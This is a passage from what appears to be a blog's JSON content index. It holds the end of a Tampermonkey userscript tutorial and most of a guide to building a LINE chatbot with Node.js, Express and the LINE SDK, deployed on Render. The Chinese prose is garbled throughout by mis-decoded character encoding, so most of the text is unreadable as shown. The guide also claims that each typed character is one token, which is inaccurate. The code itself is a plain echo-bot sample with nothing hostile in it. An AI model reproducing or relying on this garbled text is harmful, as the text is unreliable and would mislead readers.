downloadURLã€updateURLã€‚\nä½†é€™æ¨£åˆ†ç™¼å­˜åœ¨çš„å•é¡Œæ˜¯ç„¡æ³•çµ±è¨ˆä¸‹è¼‰é‡ã€å¾ç¶²çµ¡è¨ªå•çš„è§’åº¦è€ƒæ…®åŒæ™‚ç¶­è­· Github å’Œ Gitee å…©å€‹å€‰åº«ã€‚\nå¦ä¸€ç¨®åˆ†ç™¼æ–¹å¼æ˜¯ä¸Šå‚³åˆ°è…³æœ¬å¹³å° greasyfork.org/ï¼Œç™»éŒ„å¾Œå³å¯ç™¼å¸ƒæ–°è…³æœ¬ï¼Œå¦‚æœä»£ç¢¼è¨—ç®¡åœ¨ Github æˆ– GitLab é‚„å¯ä»¥ä½¿ç”¨ Webhooks å¯¦ç¾è‡ªå‹•æ›´æ–°ã€‚\né–‹ç™¼æŠ€å·§ èª¿è©¦æ²¹çŒ´è…³æœ¬ æ²¹çŒ´è…³æœ¬çš„é‹è¡Œä¾è¨—æ–¼ background script å’Œ content scriptï¼Œåœ¨èª¿è©¦å‰éœ€è¦å°é‹è¡Œç’°å¢ƒæœ‰æ‰€å€åˆ†ï¼Œä¾‹å¦‚ GM_xmlhttpRequest è«‹æ±‚æ˜¯ background script ç™¼å‡ºçš„ï¼ŒDOM è™•ç†å’Œè…³æœ¬é‚è¼¯æ˜¯ content script åŸ·è¡Œçš„ã€‚\nç¢ºå®šç’°å¢ƒä¹‹å¾Œï¼Œå°±å¯ä»¥ä½¿ç”¨å°æ‡‰çš„èª¿è©¦æ–¹å¼é€²è¡Œèª¿è©¦äº†ã€‚\nèª¿è©¦ background script é‚„æ˜¯è¨ªå• chrome://extensionï¼Œæ‰¾åˆ°æ²¹çŒ´æ’ä»¶çš„å¡ç‰‡ï¼š\ninspect views å¾Œé¢æœ‰å€‹ background.htmlï¼Œé»æ“Šä¸€ä¸‹å½ˆå‡º background script çš„èª¿è©¦å½ˆçª—ã€‚\nèª¿è©¦ content script åœ¨ç¶²é inspect -\u0026gt; Sources -\u0026gt; Page ä¸‹æ‰¾åˆ° Tampermonkey ç›®éŒ„ï¼Œé é¢ä¸­é‹è¡Œçš„æ²¹çŒ´è…³æœ¬ä»£ç¢¼éƒ½åœ¨é€™äº†ï¼Œé¸æ“‡ç›®æ¨™ï¼Œæ–·é»èª¿è©¦å³å¯ã€‚\nç²å– userId ç­‰ä¿¡æ¯ æœ‰æ™‚å€™éœ€è¦æ‹¿ä¸€äº›é¡å¤–ä¿¡æ¯åšè«‹æ±‚ï¼Œä¸€èˆ¬æœ‰ä¸‰ç¨®æ–¹å¼ï¼š\nçœ‹çœ‹èƒ½ä¸èƒ½åœ¨é é¢ä¸­æœç´¢åˆ°ï¼Œé€šé DOM ç²å– çœ‹çœ‹æœ‰æ²’æœ‰æ¥å£å¯ä»¥èª¿ç”¨ç²å– çœ‹çœ‹æœ¬åœ°å­˜å„²è£¡æœ‰æ²’æœ‰ ç›®æ¨™ DOM ç¯€é»æœªæ›è¼‰æ€éº¼è¾¦ï¼Ÿ å¦‚æœç¯€é»æ˜¯åœ¨é¦–å±åŠ è¼‰çš„ï¼Œç²—æš´çš„æ–¹æ³•æ˜¯ä½¿ç”¨ setTimeout åšä¸€ä¸‹å»¶æ™‚ã€‚\nä½†å¦‚æœæ˜¯åœ¨äº¤äº’éç¨‹ä¸­æœ‰DOM æ›´æ–°ï¼Œå°±åªèƒ½å¼•å…¥ç›£è½æ©Ÿåˆ¶äº†ï¼Œä½¿ç”¨ MutationObserver ä¾†å¯¦ç¾ã€‚\nå…·é«”çš„å¯¦ä¾‹å¯ä»¥çœ‹ã€é–‹ç™¼è¨˜éŒ„ã€‘æ˜é‡‘\u0026quot;ç ´åœˆè¡Œå‹•\u0026rdquo; è¼”åŠ©è…³æœ¬- æ˜é‡‘(juejin.cn)\næŸ¥çœ‹æ’ä»¶æºç¢¼ ç€è¦½å™¨æ’ä»¶å®‰è£ä¹‹å¾Œï¼Œæ’ä»¶åŒ…è¢«ä¸‹è¼‰åˆ°æœ¬åœ°ç›®éŒ„ä¸­ï¼Œå¯é€šéä¸‹è¿°æ–¹æ³•è¨ªå•ã€‚\nè¨ªå• chrome://versionï¼Œæ‰¾åˆ° Profile path(å­˜æ”¾ç”¨æˆ¶æ•¸æ“šçš„è·¯å¾‘)\nè¨ªå• chrome://extensions/ï¼Œæ‰¾åˆ°ç›®æ¨™æ’ä»¶çš„ID\nå°‡ Profile Path å’Œæ’ä»¶ ID æ‹¼è£åœ¨ä¸€èµ· ${Prifile Path}/Extensions/${Extension Id}ï¼Œä¾¿æ˜¯æ’ä»¶åŒ…çš„è·¯å¾‘äº†ã€‚å‹æƒ…æç¤ºï¼Œé€šéå‘½ä»¤è¡Œè¨ªå•æ™‚éœ€è¦åœ¨ç©ºæ ¼å‰åŠ å€‹ \\ è½‰ç¾©ä¸€ä¸‹ã€‚\nç¸½çµ ç€è¦½å™¨æ’ä»¶åˆ©ç”¨ç€è¦½å™¨èƒ½åŠ›é€²è¡ŒåŠŸèƒ½æ“´å±•ï¼Œå…·æœ‰è·¨åŸŸè«‹æ±‚ã€è®€å– cookieã€ç®¡ç†æ­·å²è¨˜éŒ„ã€è¨»å†Šå³éµé …ç­‰èƒ½åŠ›ã€‚\nç€è¦½å™¨æ’ä»¶çš„èƒ½åŠ›å¾ˆè±å¯Œï¼Œèƒ½å¤ å¯¦ç¾è¤‡é›œçš„åŠŸèƒ½ã€‚ä½†å¦‚æœåªæ˜¯åšä¸€äº›é‡å°é é¢çš„æ“ä½œï¼Œåªéœ€è¦ä¾è³´åŸºç¤èƒ½åŠ›ï¼Œå®Œå…¨å¯ä»¥ä½¿ç”¨æ²¹çŒ´è…³æœ¬å¯¦ç¾ï¼Œé–‹ç™¼æ›´ä¾¿æ·åˆ†ç™¼æ›´è¿…é€Ÿã€‚\né–‹ç™¼æ²¹çŒ´è…³æœ¬ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ Tampermonkey API å’Œ JavaScriptã€‚\ncreate-tampermonkey è…³æ‰‹æ¶æä¾›ä¸€å€‹å…¨é¢çš„æ²¹çŒ´è…³æœ¬é–‹ç™¼ç’°å¢ƒï¼Œä¾æ‰˜é€™å€‹ç’°å¢ƒï¼Œå¯ä»¥ä½¿ç”¨æœ€æ–°çš„ ES èªæ³•ã€TypeScriptã€CSS Modulesï¼Œåœ¨ VSCode ä¸­é€²è¡Œæ¨¡å¡ŠåŒ–é–‹ç™¼ï¼Œå¤§å¤§æé«˜é–‹ç™¼æ•ˆç‡ã€‚\né–‹ç™¼å®Œç•¢çš„æ²¹çŒ´è…³æœ¬å¯é€šé Github/Gitee Raw URL æˆ– Greasy Fork å¹³å°åˆ†ç™¼ã€‚\nç€è¦½å™¨æ’ä»¶çš„ä¸»è¦åˆ†å·¥ç‚º background script å’Œ content script å…©éƒ¨åˆ†ï¼Œåœ¨èª¿è©¦æ²¹çŒ´è…³æœ¬æ™‚éœ€è¦æ€è€ƒæ¸…æ¥šæ˜¯å“ªä¸€éƒ¨åˆ†å‡ºç¾çš„å•é¡Œï¼Œå†æ¡ç”¨å°æ‡‰çš„èª¿è©¦æ–¹å¼ã€‚\nå¯¦ç¾äº†å…©å€‹å°å¯¦è¸ï¼Œèµ°å‡ºç¬¬ä¸€æ­¥ï¼Œæ¥ä¸‹ä¾†ç›¡æƒ…ç™¼æ®å‰µé€ åŠ›å§ï¼Œç©å¾—é–‹å¿ƒï½\næœ€å¾Œåˆ†äº«ä¸€ä¸‹æˆ‘çš„ Tampermonkey UserScripts æ¸…å–®ï¼ŒæŒçºŒæ›´æ–°ï¼Œéœ€è¦çš„æ­¡è¿ä¸‹è¼‰ä¾†ä½¿ç”¨ï¼\n","date":"2022-12-15T00:00:00Z","image":"https://live.staticflickr.com/65535/52564977913_09952966be_o.jpg","permalink":"https://wayneblog.ga/2022-12-15/tampermonkey-userscript-tutorial/","title":"ã€Tampermonkeyã€‘è¼•é¬†ä¸Šæ‰‹ - æ²¹çŒ´è…³æœ¬é–‹ç™¼"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\næœ€è¿‘ OpenAI çš„ ChatGPT éå¸¸çš„ç«ç´…ï¼Œå‰›å¥½é€™å€‹ ChatGPT æ˜¯æœ‰æä¾› API å¯ä»¥ä¸²æ¥çš„ï¼Œä¹Ÿéå¸¸é©åˆæ•´åˆåˆ° Line Bot ä¸Šï¼Œæ‰€ä»¥é€™ä¸€ç¯‡æˆ‘å°±ä¾†ä»‹ç´¹å¦‚ä½•ä½¿ç”¨ Node.js åŸºæ–¼ OpenAI çš„ ChatGPT API ä¾†å»ºç«‹ä¸€å€‹ Line èŠå¤©æ©Ÿå™¨äººå§ï¼\nç”³è«‹ OpenAI API é¦–å…ˆï¼Œè«‹ä½ å…ˆé€²å…¥ OpenAI çš„ç¶²ç«™è¨»å†Šæœƒå“¡ï¼Œé€™é‚Šä½ å¯ä»¥é¸æ“‡ç¬¬ä¸‰æ–¹æœå‹™å¸³è™Ÿ(å¦‚ï¼šGoogleã€Microsoft)æˆ–æ˜¯ Email å¸³è™Ÿè¨»å†Šã€‚\nè¨»å†Šå®Œå¾Œï¼Œä½ å°±å¯ä»¥é–‹å§‹ç”³è«‹ API äº†ï¼\nå¦‚æœä½ æœ¬èº«æœ‰å¸³è™Ÿçš„è©±ï¼Œé‚£å°±ç›´æ¥ç™»å…¥ OpenAI å§ã€‚\nç™»å…¥å¾Œï¼Œä½ æ‡‰è©²æœƒçœ‹åˆ°é€™å€‹ç•«é¢\næ¥è‘—æ‰¾åˆ°ä½ çš„é ­åƒé»å®ƒï¼Œæ‰¾åˆ°ã€ŒView API keysã€ã€‚\næ‰¾åˆ°å¾Œä½ æœƒçœ‹åˆ°ã€ŒAPI keysã€çš„ç”³è«‹ç•«é¢ï¼Œé»ä¸€ä¸‹ä¸‹æ–¹çš„ã€ŒCreate New Secret keyã€ï¼Œé€™æ¨£ä½ å°±æ‹¿åˆ°ä¸²æ¥ OpenAI çš„ keyï¼Œè«‹å…ˆæŠŠå®ƒè¨˜ä¸‹ä¾†ï¼Œå¾Œé¢æœƒç”¨åˆ°ã€‚\nAPI key generated æ˜¯éå¸¸é‡è¦çš„ï¼Œå› æ­¤è«‹ä¸è¦éš¨æ„æä¾›çµ¦ä»–äººï¼Œä»¥å…é€ æˆä¸å¿…è¦çš„æå¤±ã€‚\né‚£éº¼æˆ‘å€‘ç”³è«‹é€™å€‹æ˜¯ API Key è¦å¹¹å˜›å‘¢ï¼Ÿä¸»è¦æ˜¯ç¨å¾Œå¾Œé¢æœƒä¸²æ¥ OpenAI æ‰€æä¾›çš„ API ä¾†ä½¿ç”¨ ChatGPTï¼Œå¦‚æœä½ é‚„ä¸çŸ¥é“ä»€éº¼æ˜¯ ChatGPT çš„è©±ï¼Œä½ å¯ä»¥è©¦è‘—ç©ä¸€ä¸‹ ChatGPTï¼Œç°¡å–®ä¾†è¬› ChatGPT æ˜¯ä¸€å€‹éå¸¸è°æ˜ä¸”å²å®³çš„èŠå¤©æ©Ÿå™¨äººï¼Œå®ƒå¯ä»¥åšåˆ°çš„äº‹æƒ…éå¸¸å¤šï¼Œä¾‹å¦‚åƒæ˜¯\u0026hellip;\nè«‹å®ƒè¦åŠƒæ—¥æœ¬æ—…éŠè¡Œç¨‹ å¯«ä¸€ç¯‡è¡ŒéŠ·æ–‡æ¡ˆ å¹«å¿™æ‰¾å‡ºç¨‹å¼ç¢¼éŒ¯èª¤ ç¨‹å¼ç¢¼è§£é¡Œ \u0026hellip;ç­‰ç­‰ï¼Œéå¸¸å¤š\nå› æ­¤æˆ‘å€‘ç”³è«‹é€™å€‹ API Key å°±æ˜¯ç”¨ä¾†ä¸²æ¥ ChatGPT çš„ï¼\nOpenAI æœ¬èº«æœ‰æä¾›å…è²»çš„é¡åº¦ï¼Œä¸‰å€‹æœˆ 18 ç¾é‡‘ï¼Œé™¤æ­¤ä¹‹å¤–ï¼ŒOpenAI çš„è¨ˆç®—æ–¹å¼æœƒå› ä½ ä½¿ç”¨çš„ model ä¸åŒè€Œæœ‰ä¸åŒçš„è¨ˆç®—æ–¹å¼ï¼Œä¾‹å¦‚åƒæ˜¯ã€ŒDavinciã€çš„è¨ˆç®—æ–¹å¼æ˜¯ $0.0200(ç¾é‡‘) /â€Š1K tokensï¼Œå¦‚æœä½ æƒ³è¦äº†è§£æ›´å¤šçš„è©±ï¼Œå¯ä»¥åƒè€ƒé€™é‚Šã€‚\né¡å¤–è£œå……\nä»€éº¼æ˜¯ tokensï¼Ÿ\ntokens æ˜¯æŒ‡ä½ è¼¸å…¥çš„å­—æ•¸ï¼Œä¾‹å¦‚ï¼šã€Œæˆ‘æƒ³è¦å»æ—¥æœ¬æ—…éŠã€ï¼Œé€™å¥è©±æœ‰ 8 å€‹å­—ï¼Œå› æ­¤ tokens å°±æ˜¯ 8ã€‚\nç”³è«‹ Line Developer æ¥ä¸‹ä¾†æˆ‘å€‘è¦ä¾†ç”³è«‹ Line Developer å¸³è™Ÿï¼Œä½ å¯ä»¥é€éé€™å€‹é€£çµå¿«é€Ÿé€²å…¥ Line Developer ç¶²ç«™ï¼Œç™»å…¥æ–¹å¼ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ä½¿ç”¨ LINE å¸³è™Ÿç™»å…¥ã€‚\nç™»å…¥å¾Œï¼Œä½ å¯ä»¥é€éé€™å€‹é€£çµï¼Œé€²å…¥ LINE çš„é–‹ç™¼è€…å¾Œå°ã€‚\næ¥è‘—ï¼Œä½ æœƒçœ‹åˆ°ç•«é¢ä¸Šä»€éº¼éƒ½æ²’æœ‰ï¼Œæ‰€ä»¥é€™é‚Šä½ è¦é»ä¸€ä¸‹ä¸­é–“çš„ã€ŒCreate a new providerã€ï¼Œé€™å€‹é¡ä¼¼æ–¼ä¸€å€‹å…¬å¸å¸³è™Ÿçš„æ¦‚å¿µï¼Œåº•ä¸‹æœƒæœ‰è¨±å¤šçš„å°ˆæ¡ˆï¼Œæ‰€ä»¥ä½ å¯ä»¥æŠŠå®ƒæƒ³åƒæˆä¸€å€‹å…¬å¸ï¼Œè€Œé€™å€‹å…¬å¸åº•ä¸‹æœ‰è¨±å¤šçš„å°ˆæ¡ˆï¼Œä¾‹å¦‚ï¼šLine Botã€Line MUSIC ç­‰ç­‰ä¹‹é¡ä½ çš„æœå‹™ã€‚\né€™é‚Šçš„è©±ï¼Œç¯„ä¾‹æˆ‘å€‘å°±å«åšã€ŒWayne\u0026rsquo;s OpenAI Botã€ã€‚\nå»ºç«‹çš„éç¨‹æ˜¯éå¸¸å¿«çš„ï¼Œå› æ­¤ç•¶ä½ é»ä¸‹ã€ŒCreateã€ ä¹‹å¾Œï¼Œä½ å°±å¯ä»¥é¦¬ä¸Šçœ‹åˆ° Wayne\u0026rsquo;s OpenAI Bot çš„ç•«é¢ã€‚\næ¥è‘—ï¼Œé»ä¸€ä¸‹ç•«é¢ä¸Šçš„ ã€ŒCreate a Messaging API channelã€ï¼Œå› ç‚ºæˆ‘å€‘è¦ä¾†ç”³è«‹ä¸€å€‹èŠå¤©æ©Ÿå™¨äººï¼Œæ‰€ä»¥æˆ‘å€‘è¦ä½¿ç”¨ã€ŒMessaging APIã€ã€‚\né€²å…¥ã€ŒCreate a Messaging API channelã€å¾Œï¼Œæœƒæœ‰ä¸€äº›æ¬„ä½è¦å¡«å¯«ï¼š\nChannel typeï¼š ä¿æŒé è¨­ Messages APIã€‚ Providerï¼š ä¿æŒé è¨­ ã€ŒWayne\u0026rsquo;s OpenAI Botã€ å³å¯ã€‚ Company or ownerâ€™s country or regionï¼š ä¾æ“šä½ çš„å…¬å¸æ‰€åœ¨åœ°é¸æ“‡ï¼Œé€™é‚Šæˆ‘é¸æ“‡å°ç£ã€‚ Channel iconï¼š ä½ å¯ä»¥ä¹‹å¾Œå†ä¸Šå‚³ï¼Œæ‰€ä»¥é€™é‚Šå…ˆä¸ç”¨ç®¡ã€‚ Channel nameï¼š é€™é‚Šæˆ‘å€‘å°±å«ã€ŒWayne\u0026rsquo;s AIã€å§ã€‚ Channel descriptionï¼š ä½ å¯ä»¥ç°¡å–®æè¿°ä¸€ä¸‹ï¼Œé€™å€‹èŠå¤©æ©Ÿå™¨äººçš„åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼šã€Œç”¨æ–¼ä¸²æ¥ OpenAI çš„å‰æ© Line æ©Ÿå™¨äººã€ã€‚ Categoryï¼š å°±é¸æ“‡â€¦ã€Œå…¶ä»–åª’é«”ã€ã€‚ Subcategoryï¼š æ¥è‘—ä¸€æ¨£é¸ã€Œåª’é«”ï¼ˆå…¶ä»–ï¼‰ã€ã€‚ Email addressï¼š é€™æ˜¯ç•¶ä½ çš„èŠå¤©æ©Ÿå™¨äººæœ‰å•é¡Œæ™‚ï¼Œä¿¡ç®±è¯çµ¡ä½ çš„æ–¹å¼ã€‚ Privacy policy URL èˆ‡ Terms of use URLï¼š é€™å…©å€‹å°±ä¸ç”¨ç†å®ƒï¼Œå› ç‚ºæˆ‘å€‘ç›®å‰ç”¨ä¸åˆ°ã€‚ã€‚ æœ€å¾Œå†æ‰“å‹¾å…©å€‹æ¢ç®¡ï¼Œä½ å°±å¯ä»¥é»ä¸‹ã€ŒCreateã€å»ºç«‹ä½ çš„èŠå¤©æ©Ÿå™¨äººäº†ã€‚\nç”±æ–¼é€™å€‹é é¢åœ–ç‰‡å¤ªå¤§å¼µäº†ï¼Œæ‰€ä»¥å°±ä¸é¡å¤–æˆªåœ–ã€‚\nç•¶ä½ æŒ‰ä¸‹ã€ŒCreateã€ä¹‹å¾Œï¼Œå®ƒæœƒå‡ºç¾ä¸€å€‹è¦–çª—ï¼Œä¸»è¦æ˜¯å‘ŠçŸ¥ä½ ä¸€äº›è³‡è¨Šï¼Œæ‰€ä»¥ä½ å¯ä»¥æŒ‰ä¸‹ OK é—œé–‰å®ƒã€‚\nåˆ°ç›®å‰ç‚ºæ­¢ï¼Œæˆ‘å€‘åªæ˜¯ç”³è«‹å¥½äº†ä¸€å€‹ Line Botï¼Œæ¥è‘—è¦ä¾†å–å¾—ä¸€äº›è³‡è¨Šï¼Œé¦–å…ˆåœ¨ã€ŒBase settingsã€ä¸­æ‰¾åˆ°ä»¥ä¸‹è³‡è¨Šä¸¦è¤‡è£½èµ·ä¾†ã€‚\nChannel ID Channel secret æ¥è‘—åˆ‡æ›åˆ°ã€ŒMessaging APIã€ï¼Œæ‰¾åˆ°ã€ŒChannel access tokenã€ã€‚\næ¥è‘—æŒ‰ä¸‹ ã€Œissueã€ï¼Œä½ æœƒå–å¾—ä¸€ä¸²å¾ˆé•·çš„ Tokenï¼Œè«‹è¤‡è£½èµ·ä¾†ï¼Œå¾Œé¢æˆ‘å€‘æœƒä½¿ç”¨åˆ°ã€‚\nåˆ°ç›®å‰ç‚ºæ­¢ï¼Œæˆ‘å€‘å·²ç¶“æº–å‚™å¥½äº† Line Bot çš„ç”³è«‹ä»¥åŠ OpenAI API çš„ç”³è«‹ï¼Œæ¥ä¸‹ä¾†å°±æ˜¯æº–å‚™é€²å…¥æ’°å¯«ç¨‹å¼ç¢¼çš„éƒ¨åˆ†å›‰ã€‚\nå»ºç«‹ä¸€å€‹å°ˆæ¡ˆ å»ºç«‹å°ˆæ¡ˆæ–¹å¼æˆ‘å°±ä¸å¤šè¿°äº†ï¼Œç›¸ä¿¡å¤§å®¶æ‡‰è©²éƒ½å¾ˆç†Ÿæ‚‰æ€éº¼å»ºç«‹å°ˆæ¡ˆä»¥åŠå®‰è£ Node.jsï¼Œè€Œé€™é‚Šæˆ‘ç¨å¾®æœƒæœ‰ä¸€é»ç‰¹åˆ¥ï¼Œæˆ‘æœƒä½¿ç”¨ pnpm ä¾†å»ºç«‹ï¼Œå¦‚æœä½ çœŸçš„å®Œå…¨æ²’æƒ³æ³•ï¼Œä½ å¯ä»¥åƒè€ƒæˆ‘ä»¥ä¸‹æŒ‡ä»¤ä¾†å»ºç«‹ä¸€å€‹å°ˆæ¡ˆï¼Œç•¶ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ npm æˆ–æ˜¯ yarn ä¾†å»ºç«‹ã€‚\næç¤ºï¼šä»¥ä¸‹æŒ‡ä»¤é©ç”¨æ–¼ Mac ç³»çµ±ï¼Œè‹¥ç‚º Mac å»ºè­°é¡å¤– Google ä¸€ä¸‹æŒ‡ä»¤ã€‚\n1 2 3 4 5 6 7 8 9 10 11 # è‹¥å°šæœªå®‰è£pnpmï¼Œå¯ä½¿ç”¨æ­¤æŒ‡ä»¤å…ˆé€²è¡Œå®‰è£ # npm install -g pnpm # å»ºç«‹ä¸€å€‹è³‡æ–™å¤¾ mkdir line-bot # é€²å…¥è³‡æ–™å¤¾ cd line-bot # åˆå§‹åŒ–å°ˆæ¡ˆ pnpm init åŸºæœ¬ä¸Šåˆ°é€™é‚Šå°±ç®—æ˜¯åˆå§‹åŒ–å¥½ä¸€å€‹å°ˆæ¡ˆäº†ï¼Œæ¥è‘—å°±æ˜¯æº–å‚™è¦ä¾†å®‰è£ Line Bot çš„å¥—ä»¶äº†ã€‚\nå®‰è£ç›¸é—œå¥—ä»¶ æ¥ä¸‹ä¾†æˆ‘å€‘è¦å®‰è£ @line/bot-sdk é€™å€‹å¥—ä»¶ï¼Œè«‹åœ¨å°ˆæ¡ˆçµ‚ç«¯æ©Ÿä¸‹è¼¸å…¥ä»¥ä¸‹ï¼š\n1 pnpm i @line/bot-sdk express dotenv å®‰è£å¥½ä¹‹å¾Œï¼Œä½ å¯ä»¥å…ˆåœ¨å°ˆæ¡ˆåº•ä¸‹å»ºç«‹ä¸€å€‹ app.js çš„æª”æ¡ˆï¼Œç¨å¾Œæˆ‘å€‘å°±æœƒé–‹å§‹æ’°å¯« LINE Bot çš„ç¨‹å¼ç¢¼å›‰ã€‚\næ’°å¯« LINE Bot å‰é¢æˆ‘å€‘å·²ç¶“æº–å‚™å¥½äº† app.js æª”æ¡ˆï¼Œæ¥è‘—å°±æ˜¯è¦æ’°å¯«ç¨‹å¼ç¢¼ï¼Œä¸å¤–ä¹å‰é¢å°±æ˜¯å¼•å…¥ @line/bot-sdkã€express èˆ‡ dotenv é€™ä¸‰å€‹å¥—ä»¶ã€‚\napp.js 1 2 3 4 require(\u0026#39;dotenv\u0026#39;).config(); const express = require(\u0026#39;express\u0026#39;); const line = require(\u0026#39;@line/bot-sdk\u0026#39;); æ¥è‘—å‘¢ï¼Ÿå…¶å¯¦ Line å®˜æ–¹æœ‰æä¾›ç¯„ä¾‹ç¨‹å¼ç¢¼ï¼Œå› æ­¤æˆ‘å€‘æ˜¯å¯ä»¥ç›´æ¥å˜—è©¦æŒªéä¾†æ¸¬è©¦çœ‹çœ‹ã€‚\napp.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 require(\u0026#39;dotenv\u0026#39;).config(); const line = require(\u0026#39;@line/bot-sdk\u0026#39;); const express = require(\u0026#39;express\u0026#39;); // create LINE SDK config from env variables const config = { channelAccessToken: process.env.CHANNEL_ACCESS_TOKEN, channelSecret: process.env.CHANNEL_SECRET, }; // create LINE SDK client const client = new line.Client(config); // create Express app // about Express itself: https://expressjs.com/ const app = express(); // register a webhook handler with middleware // about the middleware, please refer to doc app.post(\u0026#39;/callback\u0026#39;, line.middleware(config), (req, res) =\u0026gt; { Promise .all(req.body.events.map(handleEvent)) .then((result) =\u0026gt; res.json(result)) .catch((err) =\u0026gt; { console.error(err); res.status(500).end(); }); }); // event handler function handleEvent(event) { if (event.type !== \u0026#39;message\u0026#39; || event.message.type !== \u0026#39;text\u0026#39;) { // ignore non-text-message event return Promise.resolve(null); } // create a echoing text message const echo = { type: \u0026#39;text\u0026#39;, text: event.message.text }; // use reply API return client.replyMessage(event.replyToken, echo); } // listen on port const port = process.env.PORT || 3000; app.listen(port, () =\u0026gt; { console.log(`listening on ${port}`); }); è¨˜å¾—åœ¨å°ˆæ¡ˆåº•ä¸‹å»ºç«‹ä¸€å€‹ .env ä¸¦å¡«å¯«ä»¥ä¸‹è³‡è¨Šè·Ÿ Keyã€‚\n1 2 CHANNEL_ACCESS_TOKEN= CHANNEL_SECRET= ç†è«–ä¸Šä¾†è¬›ï¼Œä½ ç›®å‰å°ˆæ¡ˆæ‡‰è©²æ˜¯å·²ç¶“å¯ä»¥è¼¸å…¥ node app.js å•Ÿå‹•äº†ï¼Œæ‰€ä»¥ä½ å¯ä»¥å˜—è©¦å•Ÿå‹•çœ‹çœ‹ï¼Œå¦‚æœç„¡æ³•å•Ÿå‹•çš„è©±ï¼Œæœƒå»ºè­°ä½ å¾€å‰é¢çš„æ­¥é©Ÿå†æª¢æŸ¥ä¸€ä¸‹ã€‚\néƒ¨å±¬åˆ° Render åˆ°ç›®å‰ç‚ºæ­¢æˆ‘å€‘è¦å…ˆå˜—è©¦å°‡å°ˆæ¡ˆéƒ¨ç½²åˆ° Render ä¸Šé¢ï¼Œå¦å‰‡æˆ‘å€‘ä¸¦ä¸æ¸…æ¥šå°ˆæ¡ˆæ˜¯å¦å¯ä»¥æ­£å¸¸é‹ä½œï¼Œå› ç‚ºåœ¨ä½¿ç”¨ Render ä¹‹å‰ï¼Œæˆ‘å€‘éœ€è¦å…ˆå»ºç«‹ä¸€å€‹ Render çš„å¸³è™Ÿï¼Œå¦‚æœä½ é‚„æ²’æœ‰çš„è©±ï¼Œå¯ä»¥å…ˆåˆ°é€™é‚Šè¨»å†Šä¸€å€‹å¸³è™Ÿã€‚\nå»ºç«‹å¥½å¾Œï¼Œæœƒå»ºè­°ä½ å°‡å°ˆæ¡ˆç¨‹å¼ç¢¼ä¸Šå‚³åˆ° GitHub ä¸Šï¼Œå› ç‚º Render æœ‰æä¾› GitHub çš„æ•´åˆï¼Œé€™æ¨£å¯ä»¥è®“æˆ‘å€‘æ›´æ–¹ä¾¿çš„éƒ¨ç½²å°ˆæ¡ˆï¼Œè€Œä¸Šå‚³åˆ° GitHub é€™æµç¨‹å°±ä¸å†è´…è¿°äº†ï¼Œå› æ­¤æˆ‘é€™é‚Šå‡ä½¿ä½ å·²ç¶“å®Œæˆäº†å°‡ç¨‹å¼ç¢¼ä¸Šå‚³åˆ° GitHub é€™å€‹å‹•ä½œå¾Œï¼Œæ¥è‘—å°±æ˜¯ç›´æ¥é€²å…¥åˆ° Render å¾Œå°ã€‚\né€™é‚Šè«‹é¸æ“‡ ã€ŒWeb Servicesã€ã€‚\næ¥è‘—ä½ å¯ä»¥åœ¨é€™å€‹ç•«é¢ä¸Šé¸æ“‡å°ˆæ¡ˆï¼Œå¦‚æœä½ ç™¼ç¾ä½ çš„ç•«é¢ä¸Šä¸€å€‹å°ˆæ¡ˆéƒ½æ²’æœ‰çš„è©±ï¼Œå¯ä»¥é»ä¸€ä¸‹æ—é‚Šçš„ã€ŒConfigure accountã€ã€‚\næ¥è‘—ä½ å¯ä»¥åœ¨é€™é‚Šé¸æ“‡å°ˆæ¡ˆï¼Œæ‡¶ä¸€é»çš„è©±ä½ å¯ä»¥ä¹¾è„†çµ¦å®ƒå…¨éƒ¨çš„æ¬Šé™ï¼Œå› ç‚ºæˆ‘å€‘åªæ˜¯è¦éƒ¨ç½²ä¸€å€‹ç°¡å–®çš„å°ˆæ¡ˆï¼Œæ‰€ä»¥æˆ‘å°±é¸æ“‡æˆ‘è¦çš„å–®ä¸€å°ˆæ¡ˆå³å¯ã€‚\næ¥ä¸‹ä¾†ç•«é¢ä¸Šæ‡‰è©²å°±å¯ä»¥çœ‹åˆ°ä½ çš„å°ˆæ¡ˆäº†ï¼Œæ¥è‘—é»é¸ä½ è¦éƒ¨ç½²çš„å°ˆæ¡ˆã€‚\nåœ¨é€™é‚Šé»ä¸€ä¸‹ã€ŒConnectã€ã€‚\né€™é‚Šæœƒè¦æ±‚ä½ å¡«ä¸€äº›æ¬„ä½ï¼Œæˆ‘å°±ä¸å¤šèªªæ˜äº†ï¼Œæˆ‘ç›´æ¥é™„ä¸Šæˆ‘çš„è¨­å®šã€‚\næ¥è‘—å¾€ä¸‹æ»¾ï¼Œå°±é¸æ“‡ ã€ŒFreeã€å°ˆæ¡ˆå³å¯ï¼Œç„¶å¾Œå†é»ä¸€ä¸‹ä¸‹æ–¹çš„ã€ŒAdvancedã€ã€‚\nå› ç‚ºæˆ‘å€‘è¦åœ¨ã€ŒAdvancedã€å€å¡Šå¡«å…¥ç’°å¢ƒè®Šæ•¸ã€‚\næ¥è‘—é»ä¸€ä¸‹ã€ŒAdd Environment Variableã€ï¼Œä¾ç…§æ¬„ä½å¡«å…¥ã€‚\næœ€å¾Œå…¶ä»–è¨­å®šå¯ä»¥ä¸ç”¨ç®¡ï¼Œç›´æ¥é»ä¸€ä¸‹æœ€å¾Œçš„ã€ŒCreate Web Serviceã€ã€‚\né è¨­ Render æœƒå»åµæ¸¬ Commit ç´€éŒ„ï¼Œæ‰€ä»¥å¦‚æœæœ‰æ–°çš„ Commitï¼ŒRender æœƒè‡ªå‹•é‡æ–°éƒ¨ç½²ï¼Œå¦‚æœä½ ä¸æƒ³è¦é€™å€‹åŠŸèƒ½çš„è©±ï¼Œå¯ä»¥åœ¨ã€ŒAdvancedã€å€å¡Šè£¡é¢ï¼Œå°‡ã€ŒAuto Deployã€é—œé–‰ã€‚\né‚£éº¼ç”±æ–¼ç‚ºäº†æ–¹ä¾¿ç¤ºç¯„ï¼Œå› æ­¤æˆ‘é€™é‚Šé è¨­æœƒæ¡ç”¨ã€ŒYesã€ã€‚\næ¥è‘—ä½ å°±å¯ä»¥çœ‹åˆ°ä½ 